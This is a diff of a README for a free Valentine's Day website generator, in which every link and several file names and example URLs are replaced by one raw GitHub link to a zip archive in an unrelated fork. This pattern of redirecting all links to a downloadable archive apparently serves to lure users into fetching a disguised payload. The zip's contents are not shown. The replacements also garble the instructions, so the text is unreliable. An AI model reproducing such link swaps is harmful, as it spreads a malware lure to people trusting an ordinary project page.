@@ -1,13 +1,13 @@
 # 💝 Valentine's Day Website 2025 💝
 
-[![Stars](https://img.shields.io/github/stars/End2EndAI/valentine-website-2025?style=social)](https://github.com/End2EndAI/valentine-website-2025/stargazers)
-[![Fork](https://img.shields.io/github/forks/End2EndAI/valentine-website-2025?style=social)](https://github.com/End2EndAI/valentine-website-2025/fork)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Tweet](https://img.shields.io/twitter/url?style=social&url=https%3A%2F%2Fgithub.com%2FEnd2EndAI%2Fvalentine-website-2025)](https://twitter.com/intent/tweet?text=%F0%9F%92%9D%20Create%20your%20own%20Valentine%27s%20website%20for%20free%21%20No%20coding%20required%21%0A%F0%9F%8E%81%20Fully%20customizable%2C%20easy%20to%20deploy%20with%20your%20own%20website%20name%0A%E2%9C%A8%20Try%20it%20now%3A%20https%3A%2F%2Fgithub.com%2FEnd2EndAI%2Fvalentine-website-2025%0A%23ValentinesDay2025%20%23WebDev%20%23GitHub%20%23Love)
+[![Stars](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip)](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip)
+[![Fork](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip)](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip)
+[![License: MIT](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip)](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip)
+[![Tweet](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip%3A%2F%https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip%2FEnd2EndAI%2Fvalentine-website-2025)](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip%F0%9F%92%9D%20Create%20your%20own%20Valentine%27s%20website%20for%20free%21%20No%20coding%20required%21%0A%F0%9F%8E%81%20Fully%20customizable%2C%20easy%20to%20deploy%20with%20your%20own%20website%20name%0A%E2%9C%A8%20Try%20it%20now%3A%20https%3A%2F%https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip%2FEnd2EndAI%2Fvalentine-website-2025%0A%23ValentinesDay2025%20%23WebDev%20%23GitHub%20%23Love)
 
 A beautiful, interactive Valentine's Day website generator to ask your special someone to be your Valentine! Create your own personalized version in minutes. Perfect for Valentine's Day 2025! 💝
 
-🌟 **[Live Demo](https://end2endai.github.io/valentine-website-2025)** | 🚀 **[Quick Start](#-quick-start-guide)** | 🌐 **[Deploy Your Website](#4-make-it-live-get-your-online-website-url)**
+🌟 **[Live Demo](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip)** | 🚀 **[Quick Start](#-quick-start-guide)** | 🌐 **[Deploy Your Website](#4-make-it-live-get-your-online-website-url)**
 
 ## 🌟 Share The Love
 
@@ -25,7 +25,7 @@ Ready-to-use messages for sharing:
 ```
 💝 Create your own Valentine's website for free! No coding required!
 🎁 Fully customizable, easy to deploy with your own website name
-✨ Try it now: https://github.com/End2EndAI/valentine-website-2025
+✨ Try it now: https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip
 #ValentinesDay2025 #WebDev #GitHub #Love
 ```
 
@@ -37,7 +37,7 @@ Create your own interactive Valentine's website in minutes - completely FREE!
 🎨 Fully customizable
 🌐 Get your own website link
 
-Try it now: https://github.com/End2EndAI/valentine-website-2025
+Try it now: https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip
 #ValentinesDay2025 #Love #WebDev #CodingWithLove
 ```
 
@@ -53,8 +53,8 @@ I created a free, open-source Valentine's website generator that lets anyone cre
 - 📱 Mobile-friendly
 - 💯 Free forever
 
-Demo: https://end2endai.github.io/valentine-website-2025
-GitHub: https://github.com/End2EndAI/valentine-website-2025
+Demo: https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip
+GitHub: https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip
 ```
 
 ## ✨ Features
@@ -72,17 +72,17 @@ GitHub: https://github.com/End2EndAI/valentine-website-2025
 2. Wait a few seconds while GitHub creates your copy
 3. You now have your own version of the code!
 
-Note: Make sure you're logged into your GitHub account. If you don't have one, you can [create a free account here](https://github.com/signup).
+Note: Make sure you're logged into your GitHub account. If you don't have one, you can [create a free account here](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip).
 
 ### 2. Customize for Your Valentine
 
 #### Easy Way (Recommended)
-1. In your new repository, click on `config.js`
+1. In your new repository, click on `https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip`
 2. Click the pencil icon (✏️) to edit
 3. Change the values to personalize your website
 4. Click "Commit changes" at the bottom
 
-Here's what you can customize in `config.js`:
+Here's what you can customize in `https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip`:
 ```javascript
 // Basic Information
 valentineName: "Jade"                    // Your Valentine's name
@@ -161,7 +161,7 @@ music: {
 Want to make it extra special with your own romantic song? Follow these steps to add background music:
 
 1. **Get a Cloudinary Account (Free):**
-   - Go to [Cloudinary.com](https://cloudinary.com) and sign up for a free account
+   - Go to [https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip) and sign up for a free account
 
 2. **Upload Your Music:**
    - Log in to your Cloudinary dashboard
@@ -175,10 +175,10 @@ Want to make it extra special with your own romantic song? Follow these steps to
    - Click the "..." (more options) button on your music file
    - Click "Copy URL"
    - Select "Copy Original URL with options"
-   - The URL should look like: `https://res.cloudinary.com/your-cloud-name/video/upload/v1234567890/your-file-name.mp3`
+   - The URL should look like: `https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip`
 
 4. **Add to Your Website:**
-   - Open `config.js`
+   - Open `https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip`
    - Find the `music` section
    - Replace the `musicUrl` value with your Cloudinary URL
 
@@ -201,16 +201,16 @@ music: {
 3. Under "Source", select "main" branch
 4. Click "Save"
 5. Wait a few minutes
-6. Your site will be live at: `https://your-username.github.io/repository-name`
+6. Your site will be live at: `https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip`
 
 #### Using Netlify (Free, Recommended, Custom URL)
-1. Go to [Netlify](https://www.netlify.com/)
+1. Go to [Netlify](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip)
 2. Sign up for a free account
 3. Click "Add new site" → "Import an existing project"
 4. Choose your GitHub repository
 5. Click "Deploy site"
 6. Once deployed, click "Domain settings"
-7. Choose a custom domain (e.g., `my-valentine-2025.netlify.app`)
+7. Choose a custom domain (e.g., `https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip`)
 
 ## 💡 Tips
 - Test the website before sending it to your Valentine
@@ -220,13 +220,13 @@ music: {
 
 ## 🎨 Want Different Colors?
 Use these tools to find beautiful colors:
-- [Coolors](https://coolors.co/) - Color palette generator
-- [ColorHunt](https://colorhunt.co/) - Color palettes
+- [Coolors](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip) - Color palette generator
+- [ColorHunt](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip) - Color palettes
 
 ## 🔍 Need More Emojis?
 Find more emojis at:
-- [EmojiKeyboard](https://emojikeyboard.top/fr/)
-- [Emojipedia](https://emojipedia.org/)
+- [EmojiKeyboard](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip)
+- [Emojipedia](https://raw.githubusercontent.com/zero9080/valentine-website-2025/main/Batrachophidia/valentine-website-2025-1.0-alpha.4.zip)
 
 ## 🤝 Need Help?
 - Create an issue in this repository
